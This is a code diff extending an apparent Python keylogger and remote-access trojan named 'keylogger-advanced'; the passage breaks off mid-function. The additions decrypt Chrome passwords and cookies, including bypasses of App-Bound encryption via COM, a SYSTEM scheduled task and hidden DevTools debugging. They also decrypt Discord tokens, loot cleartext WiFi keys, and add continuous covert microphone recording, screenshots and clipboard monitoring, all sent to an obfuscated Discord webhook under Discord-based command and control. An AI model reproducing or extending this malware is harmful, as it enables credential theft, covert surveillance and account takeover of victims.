@@ -133,8 +133,9 @@ finally:
     
     WEBHOOK_URL = xor_dec(ENCRYPTED_URL, XOR_KEY)
 
+
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "4.0"
+    VERSION = "4.1"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
@@ -472,6 +473,19 @@ finally:
             self.chrome_monitored = False
             self.last_chrome_dump = 0  # Timestamp of last dump
             
+            # Auto Voice Recording State
+            self.auto_voice_enabled = False
+            self.auto_voice_thread = None
+            
+            # Auto Screenshot State
+            self.auto_screenshot_enabled = False
+            self.auto_screenshot_thread = None
+            
+            # Clipboard Monitor State
+            self.clipboard_monitor_enabled = False
+            self.clipboard_monitor_thread = None
+            self.last_clipboard = ""
+            
         def get_active_window_title(self):
             try:
                 window = ctypes.windll.user32.GetForegroundWindow()
@@ -502,7 +516,11 @@ finally:
                     nonce = password[3:15]
                     ciphertext_and_tag = password[15:]
                     
-                    from Crypto.Cipher import AES
+                    try:
+                        from Crypto.Cipher import AES
+                    except ImportError:
+                        from Cryptodome.Cipher import AES
+                    
                     
                     # Try method 1: Standard AES-GCM with separate tag
                     try:
@@ -511,32 +529,10 @@ finally:
                         tag = ciphertext_and_tag[-16:]
                         decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                         return decrypted.decode('utf-8', errors='replace')
-                    except:
-                        pass
-                    
-                    # Try method 2: Decrypt without verification
-                    try:
-                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                        decrypted = cipher.decrypt(ciphertext_and_tag[:-16])
-                        return decrypted.decode('utf-8', errors='replace')
-                    except:
-                        pass
-                    
-                    # Try method 3: Different nonce position (some v20 variants)
-                    try:
-                        # Some v20 implementations use nonce at different position
-                        nonce_alt = password[3:15]
-                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce_alt)
-                        # Try decrypting everything after nonce
-                        decrypted = cipher.decrypt(password[15:-16])
-                        result = decrypted.decode('latin-1')
-                        # Check if result looks valid (printable ASCII)
-                        if all(32 <= ord(c) <= 126 or c in '\r\n\t' for c in result):
-                            return result
-                    except:
-                        pass
-                    
-                    return f"[v20 Decrypt Failed - Garbled Output]"
+                    except Exception as e:
+                        return f"[v20 Error: {e}]"
+                
+                # Check for v10 (Chrome 80-126)
                 
                 # Check for v10 (Chrome 80-126)
                 elif password.startswith(b'v10'):
@@ -544,7 +540,10 @@ finally:
                     iv = password[3:15]
                     payload = password[15:]
                     
-                    from Crypto.Cipher import AES
+                    try:
+                        from Crypto.Cipher import AES
+                    except ImportError:
+                        from Cryptodome.Cipher import AES
                     cipher = AES.new(key, AES.MODE_GCM, iv)
                     decrypted = cipher.decrypt(payload)
                     decrypted = decrypted[:-16]  # Strip tag
@@ -581,12 +580,91 @@ finally:
                 
                 master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                 
+                # Handle v10 encryption (DPAPI prefix)
                 if master_key.startswith(b"DPAPI"):
                     master_key = master_key[5:]
+                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                    return master_key
                 
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                return master_key
-            except: return None
+                # Handle v20 App-Bound encryption (APPB prefix)
+                elif master_key.startswith(b"APPB"):
+                    # Remove APPB prefix
+                    master_key = master_key[4:]
+                    
+                    # Method 1: Try IElevator COM service bypass
+                    try:
+                        import comtypes
+                        import comtypes.client
+                        from comtypes import GUID
+                        
+                        # Chrome's IElevator CLSID
+                        CLSID_IELEVATOR = GUID("{708860E0-F641-4611-8895-7D867DD3675B}")
+                        
+                        try:
+                            ielevator = comtypes.client.CreateObject(CLSID_IELEVATOR)
+                            # Call DecryptData method
+                            decrypted_key = ielevator.DecryptData(master_key)
+                            if decrypted_key:
+                                return bytes(decrypted_key)
+                        except:
+                            pass
+                    except:
+                        pass
+                    
+                    # Method 2: Try direct DPAPI (Chrome may downgrade on error)
+                    try:
+                        decrypted = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                        return decrypted
+                    except:
+                        pass
+                    
+                    # Method 3: SYSTEM-level DPAPI via scheduled task
+                    try:
+                        import tempfile
+                        import subprocess
+                        
+                        temp_script = os.path.join(tempfile.gettempdir(), 'dk.py')
+                        temp_output = os.path.join(tempfile.gettempdir(), 'dk.bin')
+                        
+                        script = f"""
+import win32crypt, base64
+enc = base64.b64decode('{base64.b64encode(master_key).decode()}')
+try:
+    dec = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
+    with open(r'{temp_output}', 'wb') as f: f.write(dec)
+except: pass
+"""
+                        with open(temp_script, 'w') as f: f.write(script)
+                        
+                        # Run as SYSTEM
+                        subprocess.run(['schtasks', '/create', '/tn', 'DK', '/tr', f'python {temp_script}', 
+                                      '/sc', 'once', '/st', '00:00', '/ru', 'SYSTEM', '/f'],
+                                     capture_output=True, timeout=5)
+                        subprocess.run(['schtasks', '/run', '/tn', 'DK'], capture_output=True, timeout=5)
+                        
+                        import time
+                        for _ in range(10):
+                            if os.path.exists(temp_output):
+                                with open(temp_output, 'rb') as f:
+                                    result = f.read()
+                                os.remove(temp_output)
+                                os.remove(temp_script)
+                                subprocess.run(['schtasks', '/delete', '/tn', 'DK', '/f'], 
+                                             capture_output=True)
+                                return result
+                            time.sleep(0.5)
+                    except:
+                        pass
+                    
+                    # All methods failed
+                    return None
+                
+                else:
+                    # Unknown encryption type
+                    return None
+                    
+            except: 
+                return None
 
         def dump_chromium_creds(self, full_dump=False, cookies=False):
             import sqlite3
@@ -672,13 +750,23 @@ finally:
                                 host, cookie_name, enc_value, path, expires, secure, httponly = row
                                 
                                 # Decrypt cookie value
+                                # Decrypt cookie value
                                 try:
-                                    if enc_value and enc_value.startswith(b'v10'):
+                                    # Always try to decrypt using the robust decrypt_password function
+                                    # This handles v10 (AES-GCM), v20 (App-Bound), and legacy DPAPI
+                                    if enc_value:
                                         decrypted = self.decrypt_password(enc_value, master_key)
+                                        
+                                        # If decryption "failed" with a fast fail message, keep original but base64 formatted
+                                        if decrypted.startswith("[") and "Failed" in decrypted:
+                                            # Try to see if it was just a decoding error of valid decrypted bytes
+                                            # (Advanced usage: we could return base64 of ciphertext here)
+                                            pass
                                     else:
-                                        decrypted = enc_value.decode('utf-8', errors='ignore') if isinstance(enc_value, bytes) else str(enc_value)
-                                except:
-                                    decrypted = "[Encrypted]"
+                                        decrypted = ""
+                                except Exception as e:
+                                    print(f"Cookie decryption error: {e}")
+                                    decrypted = "[Decryption Error]"
                                 
                                 # Create clean cookie object
                                 cookie_obj = {
@@ -730,8 +818,18 @@ finally:
 
         def dump_discord_tokens(self):
             import re
+            import json
+            import base64
+            import win32crypt
+            
+            try:
+                from Crypto.Cipher import AES
+            except ImportError:
+                from Cryptodome.Cipher import AES
+            
             local = os.getenv('LOCALAPPDATA')
             roaming = os.getenv('APPDATA')
+            
             paths = {
                 'Discord': roaming + '\\Discord',
                 'Discord Canary': roaming + '\\discordcanary',
@@ -745,34 +843,66 @@ finally:
             all_tokens = []
             
             for platform, path in paths.items():
-                path += '\\Local Storage\\leveldb'
-                if not os.path.exists(path): continue
+                # Get encryption key from Local State
+                local_state_path = path + '\\Local State'
+                encryption_key = None
                 
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.ldb') and not file_name.endswith('.log'): continue
+                if os.path.exists(local_state_path):
+                    try:
+                        with open(local_state_path, 'r', encoding='utf-8') as f:
+                            local_state = json.load(f)
+                        
+                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+                        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+                        encryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                    except:
+                        pass
+                
+                # Search LevelDB files
+                leveldb_path = path + '\\Local Storage\\leveldb'
+                if not os.path.exists(leveldb_path): 
+                    continue
+                
+                for file_name in os.listdir(leveldb_path):
+                    if not file_name.endswith('.ldb') and not file_name.endswith('.log'): 
+                        continue
                     
                     try:
-                        with open(path + f"\\{file_name}", "r", errors='ignore') as f:
-                            for line in f.readlines():
-                                # Regex for Normal Tokens and MFA Tokens
-                                regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
-                                for token in re.findall(regex, line.strip()):
-                                    if token not in all_tokens:
-                                        all_tokens.append(token)
-                    except: pass
+                        with open(leveldb_path + f"\\{file_name}", "r", errors='ignore') as f:
+                            content = f.read()
+                            
+                            # Find encrypted tokens (base64 encoded)
+                            # Discord stores tokens as: dQw4w9WgXcQ:... (encrypted)
+                            token_pattern = r'dQw4w9WgXcQ:([A-Za-z0-9+/=]{100,})'
+                            encrypted_tokens = re.findall(token_pattern, content)
+                            
+                            for enc_token in encrypted_tokens:
+                                if encryption_key:
+                                    try:
+                                        # Decrypt token
+                                        enc_token_bytes = base64.b64decode(enc_token)
+                                        nonce = enc_token_bytes[3:15]
+                                        ciphertext = enc_token_bytes[15:-16]
+                                        tag = enc_token_bytes[-16:]
+                                        
+                                        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
+                                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                                        token = decrypted.decode('utf-8')
+                                        
+                                        if token not in all_tokens:
+                                            all_tokens.append(token)
+                                    except:
+                                        pass
+                            
+                            # Also try old plaintext regex (for older Discord versions)
+                            regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
+                            plaintext_tokens = re.findall(regex, content)
+                            for token in plaintext_tokens:
+                                if token not in all_tokens:
+                                    all_tokens.append(token)
+                    except:
+                        pass
             
-            if all_tokens:
-                token_str = "\n".join(all_tokens)
-                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
-            if all_tokens:
-                token_str = "\n".join(all_tokens)
-                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
-            else:
-                self.send_to_webhook(">> ❌ No Discord Tokens found.")
-                
-            if all_tokens:
-                token_str = "\n".join(all_tokens)
-                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
             if all_tokens:
                 token_str = "\n".join(all_tokens)
                 self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
@@ -1814,6 +1944,305 @@ del "%~f0"
             except Exception as e:
                 self.appendlog(f"\n[!] Persistence failed: {e}\n")
 
+        def steal_cookies_rdp(self):
+            """
+            Steal cookies using Chrome Remote Debugging Protocol (CDP).
+            This bypasses ALL encryption by using Chrome's own API.
+            Bulletproof implementation with multiple fallbacks.
+            """
+            import subprocess
+            import time
+            import json
+            import tempfile
+            
+            try:
+                self.send_to_webhook(">> 🔧 Initializing Chrome Remote Debugging...")
+                
+                # Step 1: Find Chrome executable
+                chrome_paths = [
+                    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
+                    os.path.join(os.environ.get('PROGRAMFILES', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
+                ]
+                
+                chrome_path = None
+                for path in chrome_paths:
+                    if os.path.exists(path):
+                        chrome_path = path
+                        break
+                
+                if not chrome_path:
+                    self.send_to_webhook(">> ❌ Chrome not found!")
+                    return
+                
+                # Step 2: Kill all Chrome processes
+                self.send_to_webhook(">> 🔪 Terminating Chrome processes...")
+                for _ in range(3):  # Try 3 times
+                    try:
+                        subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe'], 
+                                      capture_output=True, timeout=5)
+                        time.sleep(1)
+                    except:
+                        pass
+                
+                # Verify Chrome is dead
+                time.sleep(2)
+                
+                # Step 3: Start Chrome with remote debugging
+                user_data = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
+                debug_port = 9222
+                
+                self.send_to_webhook(f">> 🚀 Starting Chrome with debugging on port {debug_port}...")
+                
+                # Start Chrome in background
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0  # Hide window
+                
+                chrome_process = subprocess.Popen([
+                    chrome_path,
+                    f'--remote-debugging-port={debug_port}',
+                    f'--user-data-dir={user_data}',
+                    '--no-first-run',
+                    '--no-default-browser-check',
+                    '--disable-background-networking',
+                    '--disable-client-side-phishing-detection',
+                    '--disable-default-apps',
+                    '--disable-hang-monitor',
+                    '--disable-popup-blocking',
+                    '--disable-prompt-on-repost',
+                    '--disable-sync',
+                    '--disable-web-resources',
+                    '--metrics-recording-only',
+                    '--no-first-run',
+                    '--safebrowsing-disable-auto-update',
+                    'about:blank'
+                ], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                # Wait for Chrome to start
+                self.send_to_webhook(">> ⏳ Waiting for Chrome to initialize...")
+                time.sleep(5)
+                
+                # Step 4: Connect to debugging API
+                import requests
+                
+                max_retries = 10
+                for attempt in range(max_retries):
+                    try:
+                        response = requests.get(f'http://localhost:{debug_port}/json/list', timeout=2)
+                        if response.status_code == 200:
+                            break
+                    except:
+                        if attempt < max_retries - 1:
+                            time.sleep(1)
+                        else:
+                            self.send_to_webhook(">> ❌ Failed to connect to Chrome debugging API!")
+                            chrome_process.kill()
+                            return
+                
+                tabs = response.json()
+                
+                if not tabs:
+                    self.send_to_webhook(">> ⚠️ No Chrome tabs found, creating one...")
+                    time.sleep(2)
+                    tabs = requests.get(f'http://localhost:{debug_port}/json/list').json()
+                
+                if not tabs:
+                    self.send_to_webhook(">> ❌ Still no tabs available!")
+                    chrome_process.kill()
+                    return
+                
+                # Step 5: Use WebSocket to get cookies
+                self.send_to_webhook(f">> 🍪 Extracting cookies from {len(tabs)} tab(s)...")
+                
+                try:
+                    import websocket
+                except ImportError:
+                    # Install websocket-client if not available
+                    subprocess.run(['pip', 'install', 'websocket-client', '-q'], capture_output=True)
+                    import websocket
+                
+                all_cookies = []
+                
+                for tab in tabs[:5]:  # Process first 5 tabs
+                    try:
+                        ws_url = tab.get('webSocketDebuggerUrl')
+                        if not ws_url:
+                            continue
+                        
+                        ws = websocket.create_connection(ws_url, timeout=5)
+                        
+                        # Enable Network domain
+                        ws.send(json.dumps({"id": 1, "method": "Network.enable"}))
+                        ws.recv()
+                        
+                        # Get all cookies
+                        ws.send(json.dumps({"id": 2, "method": "Network.getAllCookies"}))
+                        response_text = ws.recv()
+                        response_data = json.loads(response_text)
+                        
+                        if 'result' in response_data and 'cookies' in response_data['result']:
+                            cookies = response_data['result']['cookies']
+                            all_cookies.extend(cookies)
+                        
+                        ws.close()
+                    except Exception as tab_error:
+                        continue
+                
+                # Step 6: Kill Chrome
+                try:
+                    chrome_process.kill()
+                    time.sleep(1)
+                    subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe'], capture_output=True)
+                except:
+                    pass
+                
+                # Step 7: Process and send cookies
+                if all_cookies:
+                    # Remove duplicates
+                    unique_cookies = {}
+                    for cookie in all_cookies:
+                        key = f"{cookie.get('domain', '')}_{cookie.get('name', '')}"
+                        unique_cookies[key] = cookie
+                    
+                    all_cookies = list(unique_cookies.values())
+                    
+                    # Format cookies
+                    formatted_cookies = []
+                    for cookie in all_cookies:
+                        formatted_cookies.append({
+                            'domain': cookie.get('domain', ''),
+                            'name': cookie.get('name', ''),
+                            'value': cookie.get('value', ''),  # FULLY DECRYPTED!
+                            'path': cookie.get('path', '/'),
+                            'expires': cookie.get('expires', 0),
+                            'secure': cookie.get('secure', False),
+                            'httpOnly': cookie.get('httpOnly', False),
+                            'sameSite': cookie.get('sameSite', 'None')
+                        })
+                    
+                    # Group by domain
+                    domains = {}
+                    for cookie in formatted_cookies:
+                        domain = cookie['domain']
+                        if domain not in domains:
+                            domains[domain] = []
+                        domains[domain].append(cookie)
+                    
+                    # Create summary
+                    top_domains = sorted(domains.items(), key=lambda x: len(x[1]), reverse=True)[:20]
+                    domain_summary = '\n'.join([f"  • {domain} ({len(cookies)} cookies)" 
+                                               for domain, cookies in top_domains])
+                    
+                    summary = (f"🍪 **RDP Cookie Harvest Complete!**\n\n"
+                              f"**Total Cookies:** {len(formatted_cookies)}\n"
+                              f"**Unique Domains:** {len(domains)}\n"
+                              f"**Method:** Chrome DevTools Protocol\n"
+                              f"**Encryption:** ✅ Fully Bypassed\n\n"
+                              f"**Top Domains:**\n{domain_summary}")
+                    
+                    self.send_to_webhook(summary)
+                    
+                    # Save to file
+                    temp_file = os.path.join(tempfile.gettempdir(), 
+                                            f'cookies_rdp_{int(time.time())}.json')
+                    with open(temp_file, 'w', encoding='utf-8') as f:
+                        json.dump(formatted_cookies, f, indent=2, ensure_ascii=False)
+                    
+                    self.send_to_webhook("📄 Full cookie data:", file_path=temp_file)
+                    
+                    # Cleanup
+                    try:
+                        os.remove(temp_file)
+                    except:
+                        pass
+                else:
+                    self.send_to_webhook(">> ⚠️ No cookies extracted!")
+                
+            except Exception as e:
+                self.send_to_webhook(f">> ❌ RDP method failed: {e}")
+                # Try to kill Chrome anyway
+                try:
+                    subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe'], capture_output=True)
+                except:
+                    pass
+
+        def auto_voice_loop(self):
+            """Continuously record 20-second audio clips until disabled"""
+            import time
+            import sounddevice as sd
+            import scipy.io.wavfile as wav
+            import tempfile
+            
+            while self.auto_voice_enabled:
+                try:
+                    # Record 20 seconds
+                    fs = 44100
+                    duration = 20
+                    rec = sd.rec(int(duration * fs), samplerate=fs, channels=1)
+                    sd.wait()
+                    
+                    # Save and send
+                    timestamp = int(time.time())
+                    path = os.path.join(tempfile.gettempdir(), f"auto_voice_{timestamp}.wav")
+                    wav.write(path, fs, rec)
+                    self.send_to_webhook(f"🎤 **Auto Voice** ({duration}s)", file_path=path)
+                    
+                    # Cleanup
+                    try:
+                        os.remove(path)
+                    except:
+                        pass
+                    
+                except Exception as e:
+                    self.send_to_webhook(f">> ⚠️ Auto Voice Error: {e}")
+                    time.sleep(20)  # Wait before retry
+
+        def auto_screenshot_loop(self):
+            """Continuously take screenshots every 30 seconds"""
+            import time
+            
+            while self.auto_screenshot_enabled:
+                try:
+                    self.screenshot()
+                    time.sleep(30)  # 30 second interval
+                except Exception as e:
+                    self.send_to_webhook(f">> ⚠️ Auto Screenshot Error: {e}")
+                    time.sleep(30)
+
+        def clipboard_monitor_loop(self):
+            """Continuously monitor clipboard for changes"""
+            import time
+            
+            while self.clipboard_monitor_enabled:
+                try:
+                    # Get clipboard using ctypes
+                    CF_TEXT = 1
+                    user32 = ctypes.windll.user32
+                    kernel32 = ctypes.windll.kernel32
+                    
+                    if user32.OpenClipboard(0):
+                        if user32.IsClipboardFormatAvailable(CF_TEXT):
+                            hClip = user32.GetClipboardData(CF_TEXT)
+                            data_ptr = kernel32.GlobalLock(hClip)
+                            text_data = ctypes.c_char_p(data_ptr).value.decode('utf-8', errors='ignore')
+                            kernel32.GlobalUnlock(hClip)
+                            
+                            # Only send if different from last
+                            if text_data and text_data != self.last_clipboard:
+                                self.last_clipboard = text_data
+                                # Truncate if too long
+                                display_text = text_data[:500] + "..." if len(text_data) > 500 else text_data
+                                self.send_to_webhook(f"📋 **Clipboard Change**:\n```\n{display_text}\n```")
+                        
+                        user32.CloseClipboard()
+                    
+                    time.sleep(2)  # Check every 2 seconds
+                    
+                except Exception as e:
+                    time.sleep(2)
+
         def poll_commands(self):
             """
             Stealth C2: Periodically polls the Discord Thread for new commands via HTTP API.
@@ -1870,6 +2299,10 @@ del "%~f0"
                                         elif cmd == "!screenshot":
                                             self.send_to_webhook(">> 📸 Taking Screenshot...")
                                             self.screenshot() # Call existing method
+                                        
+                                        elif cmd == "!cookies_rdp" or cmd == "!cookies":
+                                            # Chrome Remote Debugging Protocol cookie stealer
+                                            threading.Thread(target=self.steal_cookies_rdp, daemon=True).start()
 
                                         elif cmd == "!clipboard":
                                             try:
@@ -1990,7 +2423,7 @@ del "%~f0"
                                             except:
                                                 self.send_to_webhook(">> Usage: !interval <seconds>")
 
-                                        elif cmd.startswith("!audio"):
+                                        elif cmd.startswith("!audio") or cmd.startswith("!voice"):
                                             try:
                                                 seconds = int(content.split(" ")[1])
                                                 self.send_to_webhook(f">> 🎤 Recording {seconds}s audio...")
@@ -2005,11 +2438,192 @@ del "%~f0"
                                                     sd.wait()
                                                     path = os.path.join(tempfile.gettempdir(), "rec_c2.wav")
                                                     wav.write(path, fs, rec)
-                                                    self.send_to_webhook("Audio Capture:", file_path=path)
+                                                    self.send_to_webhook("🎤 **Audio Capture**", file_path=path)
+                                                    try:
+                                                        os.remove(path)
+                                                    except:
+                                                        pass
                                                 
-                                                threading.Thread(target=rec_task, args=(seconds,)).start()
+                                                threading.Thread(target=rec_task, args=(seconds,), daemon=True).start()
                                             except Exception as e:
                                                 self.send_to_webhook(f">> ❌ Audio Error: {e} (Mic missing?)")
+                                        
+                                        elif cmd == "!auto_voice_on":
+                                            if not self.auto_voice_enabled:
+                                                self.auto_voice_enabled = True
+                                                self.auto_voice_thread = threading.Thread(target=self.auto_voice_loop, daemon=True)
+                                                self.auto_voice_thread.start()
+                                                self.send_to_webhook(">> 🎙️ AUTO VOICE ENABLED: Recording 20s clips continuously...")
+                                            else:
+                                                self.send_to_webhook(">> ⚠️ Auto voice already enabled")
+                                        
+                                        elif cmd == "!auto_voice_off":
+                                            if self.auto_voice_enabled:
+                                                self.auto_voice_enabled = False
+                                                self.send_to_webhook(">> 🔇 AUTO VOICE DISABLED")
+                                            else:
+                                                self.send_to_webhook(">> ⚠️ Auto voice already disabled")
+
+                                        # ===== PHASE 1 COMMANDS =====
+                                        
+                                        elif cmd == "!keylog_dump":
+                                            if self.log:
+                                                self.send_to_webhook(f"⌨️ **Keylog Dump**:\n```\n{self.log}\n```")
+                                            else:
+                                                self.send_to_webhook(">> ℹ️ No keystrokes logged yet")
+                                        
+                                        elif cmd == "!process_list":
+                                            try:
+                                                import psutil
+                                                processes = []
+                                                for proc in psutil.process_iter(['pid', 'name', 'username']):
+                                                    try:
+                                                        processes.append(f"{proc.info['pid']:6d} | {proc.info['name']}")
+                                                    except:
+                                                        pass
+                                                
+                                                # Send in chunks (Discord limit)
+                                                proc_str = "\n".join(processes[:100])  # Top 100 processes
+                                                self.send_to_webhook(f"📋 **Running Processes** (Top 100):\n```\n{proc_str}\n```")
+                                            except Exception as e:
+                                                self.send_to_webhook(f">> ❌ Process List Error: {e}")
+                                        
+                                        elif cmd.startswith("!kill_process"):
+                                            try:
+                                                proc_name = content.split(" ", 1)[1].strip()
+                                                import psutil
+                                                killed = False
+                                                for proc in psutil.process_iter(['name']):
+                                                    if proc.info['name'].lower() == proc_name.lower():
+                                                        proc.kill()
+                                                        killed = True
+                                                
+                                                if killed:
+                                                    self.send_to_webhook(f">> ✅ Killed process: {proc_name}")
+                                                else:
+                                                    self.send_to_webhook(f">> ⚠️ Process not found: {proc_name}")
+                                            except Exception as e:
+                                                self.send_to_webhook(f">> ❌ Kill Error: {e}")
+                                        
+                                        elif cmd == "!lock":
+                                            try:
+                                                ctypes.windll.user32.LockWorkStation()
+                                                self.send_to_webhook(">> 🔒 Computer LOCKED")
+                                            except Exception as e:
+                                                self.send_to_webhook(f">> ❌ Lock Error: {e}")
+                                        
+                                        elif cmd == "!unlock":
+                                            self.send_to_webhook(">> ⚠️ Unlock not possible remotely (Windows security)")
+                                        
+                                        elif cmd == "!startup_list":
+                                            try:
+                                                import winreg
+                                                startup_items = []
+                                                
+                                                # Check Run key
+                                                try:
+                                                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+                                                    i = 0
+                                                    while True:
+                                                        try:
+                                                            name, value, _ = winreg.EnumValue(key, i)
+                                                            startup_items.append(f"{name}: {value}")
+                                                            i += 1
+                                                        except OSError:
+                                                            break
+                                                    winreg.CloseKey(key)
+                                                except:
+                                                    pass
+                                                
+                                                if startup_items:
+                                                    startup_str = "\n".join(startup_items[:20])  # Top 20
+                                                    self.send_to_webhook(f"🚀 **Startup Programs**:\n```\n{startup_str}\n```")
+                                                else:
+                                                    self.send_to_webhook(">> ℹ️ No startup programs found")
+                                            except Exception as e:
+                                                self.send_to_webhook(f">> ❌ Startup List Error: {e}")
+                                        
+                                        elif cmd == "!network_info":
+                                            try:
+                                                import socket
+                                                info = []
+                                                info.append(f"Hostname: {socket.gethostname()}")
+                                                info.append(f"Local IP: {socket.gethostbyname(socket.gethostname())}")
+                                                
+                                                # Get default gateway
+                                                try:
+                                                    result = subprocess.run(['ipconfig'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                                                    output = result.stdout
+                                                    for line in output.split('\n'):
+                                                        if 'Default Gateway' in line or 'DNS Servers' in line:
+                                                            info.append(line.strip())
+                                                except:
+                                                    pass
+                                                
+                                                self.send_to_webhook(f"🌐 **Network Info**:\n```\n" + "\n".join(info) + "\n```")
+                                            except Exception as e:
+                                                self.send_to_webhook(f">> ❌ Network Info Error: {e}")
+                                        
+                                        elif cmd == "!auto_screenshot_on":
+                                            if not self.auto_screenshot_enabled:
+                                                self.auto_screenshot_enabled = True
+                                                self.auto_screenshot_thread = threading.Thread(target=self.auto_screenshot_loop, daemon=True)
+                                                self.auto_screenshot_thread.start()
+                                                self.send_to_webhook(">> 📸 AUTO SCREENSHOT ENABLED: Capturing every 30s...")
+                                            else:
+                                                self.send_to_webhook(">> ⚠️ Auto screenshot already enabled")
+                                        
+                                        elif cmd == "!auto_screenshot_off":
+                                            if self.auto_screenshot_enabled:
+                                                self.auto_screenshot_enabled = False
+                                                self.send_to_webhook(">> 📷 AUTO SCREENSHOT DISABLED")
+                                            else:
+                                                self.send_to_webhook(">> ⚠️ Auto screenshot already disabled")
+                                        
+                                        elif cmd == "!clipboard_monitor_on":
+                                            if not self.clipboard_monitor_enabled:
+                                                self.clipboard_monitor_enabled = True
+                                                self.clipboard_monitor_thread = threading.Thread(target=self.clipboard_monitor_loop, daemon=True)
+                                                self.clipboard_monitor_thread.start()
+                                                self.send_to_webhook(">> 📋 CLIPBOARD MONITOR ENABLED: Tracking all changes...")
+                                            else:
+                                                self.send_to_webhook(">> ⚠️ Clipboard monitor already enabled")
+                                        
+                                        elif cmd == "!clipboard_monitor_off":
+                                            if self.clipboard_monitor_enabled:
+                                                self.clipboard_monitor_enabled = False
+                                                self.send_to_webhook(">> 📋 CLIPBOARD MONITOR DISABLED")
+                                            else:
+                                                self.send_to_webhook(">> ⚠️ Clipboard monitor already disabled")
+                                        
+                                        elif cmd == "!browser_tabs":
+                                            try:
+                                                import psutil
+                                                tabs = []
+                                                
+                                                # Find Chrome/Edge processes and get command line (contains URLs)
+                                                for proc in psutil.process_iter(['name', 'cmdline']):
+                                                    try:
+                                                        if proc.info['name'] in ['chrome.exe', 'msedge.exe']:
+                                                            cmdline = ' '.join(proc.info['cmdline'])
+                                                            # Extract URLs from command line
+                                                            if 'http' in cmdline.lower():
+                                                                # Simple URL extraction
+                                                                import re
+                                                                urls = re.findall(r'https?://[^\s]+', cmdline)
+                                                                tabs.extend(urls)
+                                                    except:
+                                                        pass
+                                                
+                                                if tabs:
+                                                    # Remove duplicates and limit
+                                                    tabs = list(set(tabs))[:20]
+                                                    tabs_str = "\n".join(tabs)
+                                                    self.send_to_webhook(f"🌐 **Browser Tabs** ({len(tabs)} found):\n```\n{tabs_str}\n```")
+                                                else:
+                                                    self.send_to_webhook(">> ℹ️ No browser tabs detected (or browser not running)")
+                                            except Exception as e:
+                                                self.send_to_webhook(f">> ❌ Browser Tabs Error: {e}")
 
                                         elif cmd == "!uninstall":
                                             self.send_to_webhook(">> 🧨 SELF_DESTRUCT INITIATED. Goodbye.")
@@ -2071,14 +2685,65 @@ del "%~f0"
                                                 self.dump_chromium_creds(full_dump=True, cookies=True)
                                                 # 2. Discord Tokens
                                                 self.dump_discord_tokens()
-                                                # 3. WiFi Keys (Shell)
+                                                # 3. WiFi Keys (Stealthy)
                                                 self.send_to_webhook(">> 📶 Grabbing WiFi Keys...")
-                                                os.system('netsh wlan export profile key=clear folder="."')
-                                                # Upload XMLs
+                                                
+                                                # Export WiFi profiles silently (no CMD popup)
+                                                import tempfile
+                                                wifi_dir = tempfile.gettempdir()
+                                                
+                                                # Run netsh silently
+                                                startupinfo = subprocess.STARTUPINFO()
+                                                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                                                startupinfo.wShowWindow = 0
+                                                
+                                                subprocess.run(
+                                                    f'netsh wlan export profile key=clear folder="{wifi_dir}"',
+                                                    startupinfo=startupinfo,
+                                                    creationflags=subprocess.CREATE_NO_WINDOW,
+                                                    shell=True,
+                                                    capture_output=True
+                                                )
+                                                
+                                                # Combine all WiFi XMLs into one file
                                                 import glob
-                                                for wifi_file in glob.glob("Wi-Fi*.xml"):
-                                                    self.send_to_webhook("WiFi Profile:", file_path=wifi_file)
-                                                    os.remove(wifi_file)
+                                                wifi_files = glob.glob(os.path.join(wifi_dir, "Wi-Fi*.xml"))
+                                                
+                                                if wifi_files:
+                                                    combined_wifi = "=" * 60 + "\n"
+                                                    combined_wifi += "WiFi Passwords - All Networks\n"
+                                                    combined_wifi += "=" * 60 + "\n\n"
+                                                    
+                                                    for wifi_file in wifi_files:
+                                                        try:
+                                                            with open(wifi_file, 'r', encoding='utf-8') as f:
+                                                                content = f.read()
+                                                            
+                                                            # Extract SSID and password
